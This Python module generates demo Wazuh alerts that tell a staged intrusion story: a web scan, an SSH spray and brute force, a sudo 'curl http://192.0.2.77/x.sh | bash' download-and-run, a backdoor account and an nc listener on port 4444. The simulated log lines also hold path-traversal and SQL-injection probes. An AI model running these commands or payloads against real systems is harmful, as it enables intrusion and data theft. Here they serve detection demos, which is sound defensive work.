"""Built-in demo data: the same attack Trellis's samples tell, as the alerts
Wazuh 4.14's default ruleset would raise for it.

Rule IDs, levels, descriptions and MITRE mappings are copied from the
official ruleset (0095-sshd_rules.xml, 0245-web_rules.xml, 0020-syslog_rules.xml,
0280-attack_rules.xml, 0015-ossec_rules.xml). Timestamps are relative to "now"
so the story always shows up in the last few hours.

The story:
  1. 203.0.113.99 scans the website (Nikto/gobuster style 404 storm)
  2. 203.0.113.45 password-sprays SSH with made-up usernames
  3. 192.0.2.77 probes the site (path traversal, SQL injection)...
  4. ...brute-forces SSH for 'deploy' and gets in
  5. opens a root shell with sudo, pipes a download into bash
  6. creates a backdoor account 'support'
  7. a new listening port shows up on web01
plus ordinary background noise from two hosts.
"""

from __future__ import annotations

import itertools
from collections import Counter
from datetime import datetime, timedelta

# technique ID -> (technique name, tactics), as Wazuh enriches rule.mitre
MITRE = {
    "T1110": ("Brute Force", ["Credential Access"]),
    "T1110.001": ("Password Guessing", ["Credential Access"]),
    "T1021": ("Remote Services", ["Lateral Movement"]),
    "T1021.004": ("SSH", ["Lateral Movement"]),
    "T1078": ("Valid Accounts", ["Defense Evasion", "Persistence", "Privilege Escalation", "Initial Access"]),
    "T1595.002": ("Vulnerability Scanning", ["Reconnaissance"]),
    "T1190": ("Exploit Public-Facing Application", ["Initial Access"]),
    "T1055": ("Process Injection", ["Defense Evasion", "Privilege Escalation"]),
    "T1083": ("File and Directory Discovery", ["Discovery"]),
    "T1548.003": ("Sudo and Sudo Caching", ["Privilege Escalation", "Defense Evasion"]),
    "T1136": ("Create Account", ["Persistence"]),
}

# rule ID -> (level, description, groups, MITRE IDs)
RULES = {
    "5402": (3, "Successful sudo to ROOT executed.", ["syslog", "sudo"], ["T1548.003"]),
    "5501": (3, "PAM: Login session opened.", ["pam", "syslog", "authentication_success"], ["T1078"]),
    "5710": (5, "sshd: Attempt to login using a non-existent user", ["syslog", "sshd", "authentication_failed", "invalid_login"], ["T1110.001", "T1021.004"]),
    "5712": (10, "sshd: brute force trying to get access to the system. Non existent user.", ["syslog", "sshd", "authentication_failures"], ["T1110"]),
    "5715": (3, "sshd: authentication success.", ["syslog", "sshd", "authentication_success"], ["T1078", "T1021"]),
    "5760": (5, "sshd: authentication failed.", ["syslog", "sshd", "authentication_failed"], ["T1110.001", "T1021.004"]),
    "5763": (10, "sshd: brute force trying to get access to the system. Authentication failed.", ["syslog", "sshd", "authentication_failures"], ["T1110"]),
    "5902": (8, "New user added to the system.", ["syslog", "adduser"], ["T1136"]),
    "40112": (12, "Multiple authentication failures followed by a success.", ["syslog", "attack"], ["T1078", "T1110"]),
    "31101": (5, "Web server 400 error code.", ["web", "accesslog", "attack"], []),
    "31103": (7, "SQL injection attempt.", ["web", "accesslog", "attack", "sql_injection"], ["T1190"]),
    "31104": (6, "Common web attack.", ["web", "accesslog", "attack"], ["T1055", "T1083"]),
    "31151": (10, "Multiple web server 400 error codes from same source ip.", ["web", "accesslog", "web_scan", "recon"], ["T1595.002"]),
    "533": (7, "Listened ports status (netstat) changed (new port opened or closed).", ["ossec"], []),
}

AGENTS = {
    "web01": {"id": "001", "name": "web01", "ip": "10.0.0.10"},
    "db01": {"id": "002", "name": "db01", "ip": "10.0.0.20"},
}

LOCATIONS = {"sshd": "/var/log/auth.log", "sudo": "/var/log/auth.log", "pam": "/var/log/auth.log",
             "useradd": "/var/log/auth.log", "web-accesslog": "/var/log/nginx/access.log",
             "ossec": "netstat listening ports"}


class _Builder:
    def __init__(self, now: datetime):
        self.now = now
        self.docs: list[tuple[str, dict]] = []
        self.fired: Counter[str] = Counter()
        self._ids = itertools.count(1)

    def add(self, ts: datetime, rule_id: str, agent: str, decoder: str, full_log: str, **data):
        level, desc, groups, mitre_ids = RULES[rule_id]
        self.fired[rule_id] += 1
        rule = {"id": rule_id, "level": level, "description": desc, "groups": groups,
                "firedtimes": self.fired[rule_id]}
        if mitre_ids:
            rule["mitre"] = {
                "id": mitre_ids,
                "technique": [MITRE[m][0] for m in mitre_ids],
                "tactic": sorted({t for m in mitre_ids for t in MITRE[m][1]}),
            }
        doc = {
            "timestamp": ts.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + ts.strftime("%z"),
            "rule": rule,
            "agent": AGENTS[agent],
            "manager": {"name": "wazuh.manager"},
            "id": f"{int(ts.timestamp())}.{next(self._ids)}",
            "decoder": {"name": decoder},
            "full_log": full_log,
            "location": LOCATIONS.get(decoder, ""),
        }
        if data:
            doc["data"] = {k: str(v) for k, v in data.items()}
        self.docs.append((f"demo-{len(self.docs) + 1:04d}", doc))

    # log line helpers ------------------------------------------------------
    @staticmethod
    def syslog(ts: datetime, host: str, proc: str, msg: str) -> str:
        return f"{ts.isoformat(timespec='seconds')} {host} {proc}: {msg}"

    @staticmethod
    def access(ts: datetime, ip: str, method: str, path: str, status: int, ua: str) -> str:
        stamp = ts.strftime("%d/%b/%Y:%H:%M:%S %z")
        return f'{ip} - - [{stamp}] "{method} {path} HTTP/1.1" {status} 153 "-" "{ua}"'


def generate(now: datetime | None = None) -> list[tuple[str, dict]]:
    now = (now or datetime.now()).astimezone()
    b = _Builder(now)
    t0 = now - timedelta(hours=3, minutes=10)

    # Background: normal admin logins and sudo use over the past week ------
    for day in range(6, -1, -1):
        for host, user, ip in (("web01", "deploy", "10.0.0.5"), ("db01", "dba", "10.0.0.6")):
            ts = (now - timedelta(days=day)).replace(hour=9, minute=15 + day, second=2)
            if ts > now:
                continue
            port = 50100 + day
            b.add(ts, "5715", host, "sshd",
                  b.syslog(ts, host, f"sshd[{2200 + day}]", f"Accepted publickey for {user} from {ip} port {port} ssh2"),
                  srcip=ip, dstuser=user, srcport=port)
            ts2 = ts + timedelta(minutes=5)
            if ts2 <= now:
                b.add(ts2, "5402", host, "sudo",
                      b.syslog(ts2, host, "sudo", f"{user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx"),
                      srcuser=user, dstuser="root", command="/usr/bin/systemctl restart nginx")

    # 1. Web scan from 203.0.113.99 ------------------------------------------
    scan_paths = ["/admin", "/backup.zip", "/.git/config", "/phpmyadmin/", "/wp-login.php", "/.env",
                  "/server-status", "/config.php.bak", "/db.sql", "/old/", "/test/", "/cgi-bin/test.cgi",
                  "/manager/html", "/api/v1/debug"]
    for i, path in enumerate(scan_paths):
        ts = t0 + timedelta(seconds=i * 2)
        b.add(ts, "31101", "web01", "web-accesslog",
              b.access(ts, "203.0.113.99", "GET", path, 404, "Mozilla/5.00 (Nikto/2.5.0)"),
              srcip="203.0.113.99", protocol="GET", url=path, id=404)
    ts = t0 + timedelta(seconds=len(scan_paths) * 2)
    b.add(ts, "31151", "web01", "web-accesslog",
          b.access(ts, "203.0.113.99", "GET", "/api/v1/debug", 404, "Mozilla/5.00 (Nikto/2.5.0)"),
          srcip="203.0.113.99", protocol="GET", url="/api/v1/debug", id=404)

    # 2. SSH password spray from 203.0.113.45 --------------------------------
    t1 = t0 + timedelta(minutes=12)
    for i, user in enumerate(["admin", "admin", "root", "test", "oracle", "postgres", "ubuntu", "git"]):
        ts = t1 + timedelta(seconds=i * 2)
        line = f"Failed password for invalid user {user} from 203.0.113.45 port {40011 + i * 5} ssh2"
        b.add(ts, "5710", "web01", "sshd", b.syslog(ts, "web01", f"sshd[{4410 + i}]", line),
              srcip="203.0.113.45", srcuser=user, srcport=40011 + i * 5)
    ts = t1 + timedelta(seconds=16)
    b.add(ts, "5712", "web01", "sshd",
          b.syslog(ts, "web01", "sshd[4418]", "Failed password for invalid user git from 203.0.113.45 port 40046 ssh2"),
          srcip="203.0.113.45", srcuser="git", srcport=40046)

    # 3. Web probing from 192.0.2.77 -----------------------------------------
    t2 = t0 + timedelta(minutes=40)
    probes = [
        ("31101", "/login.php", 404),
        ("31104", "/download.php?file=../../../../etc/passwd", 403),
        ("31104", "/static/..%2F..%2F..%2Fetc%2Fpasswd", 400),
        ("31103", "/products.php?id=1%20union%20select%20username,password%20from%20users", 200),
        ("31103", "/products.php?id=1+union+select+null,null--", 500),
        ("31101", "/.env", 404),
    ]
    for i, (rule_id, path, status) in enumerate(probes):
        ts = t2 + timedelta(seconds=i * 7)
        ua = "sqlmap/1.8.4#stable (https://sqlmap.org)" if rule_id == "31103" else "Mozilla/5.0 (X11; Linux x86_64)"
        b.add(ts, rule_id, "web01", "web-accesslog", b.access(ts, "192.0.2.77", "GET", path, status, ua),
              srcip="192.0.2.77", protocol="GET", url=path, id=status)

    # 4. SSH brute force that succeeds ---------------------------------------
    t3 = t0 + timedelta(minutes=75)
    for i in range(8):
        ts = t3 + timedelta(seconds=i * 3)
        port = 51000 + i * 5
        b.add(ts, "5760", "web01", "sshd",
              b.syslog(ts, "web01", f"sshd[{8001 + i}]", f"Failed password for deploy from 192.0.2.77 port {port} ssh2"),
              srcip="192.0.2.77", dstuser="deploy", srcport=port)
    ts = t3 + timedelta(seconds=21)
    b.add(ts, "5763", "web01", "sshd",
          b.syslog(ts, "web01", "sshd[8008]", "Failed password for deploy from 192.0.2.77 port 51035 ssh2"),
          srcip="192.0.2.77", dstuser="deploy", srcport=51035)
    ts = t3 + timedelta(seconds=26)
    login = b.syslog(ts, "web01", "sshd[8009]", "Accepted password for deploy from 192.0.2.77 port 51040 ssh2")
    b.add(ts, "40112", "web01", "sshd", login, srcip="192.0.2.77", dstuser="deploy", srcport=51040)

    # 5. Root shell and download-and-run -------------------------------------
    t4 = t3 + timedelta(minutes=1)
    for i, cmd in enumerate(["/bin/bash", "/bin/bash -c curl http://192.0.2.77/x.sh | bash"]):
        ts = t4 + timedelta(seconds=i * 45)
        b.add(ts, "5402", "web01", "sudo",
              b.syslog(ts, "web01", "sudo", f"deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND={cmd}"),
              srcuser="deploy", dstuser="root", command=cmd)

    # 6. Backdoor account ----------------------------------------------------
    ts = t4 + timedelta(minutes=2)
    b.add(ts, "5902", "web01", "useradd",
          b.syslog(ts, "web01", "useradd[8120]", "new user: name=support, UID=1050, GID=1050, home=/home/support, shell=/bin/bash"),
          dstuser="support")

    # 7. New listening port (Wazuh's netstat check runs every 6 minutes) -----
    ts = t4 + timedelta(minutes=6)
    b.add(ts, "533", "web01", "ossec",
          "ossec: output: 'netstat listening ports':\ntcp 0.0.0.0:22 0.0.0.0:* 812/sshd\n"
          "tcp 0.0.0.0:80 0.0.0.0:* 901/nginx\ntcp 0.0.0.0:4444 0.0.0.0:* 8133/nc")

    # Quieter host: a few failed logins on db01 that go nowhere --------------
    for i in range(3):
        ts = now - timedelta(minutes=40 - i * 4)
        b.add(ts, "5760", "db01", "sshd",
              b.syslog(ts, "db01", f"sshd[{3100 + i}]", f"Failed password for dba from 10.0.0.6 port {52000 + i} ssh2"),
              srcip="10.0.0.6", dstuser="dba", srcport=52000 + i)

    return b.docs
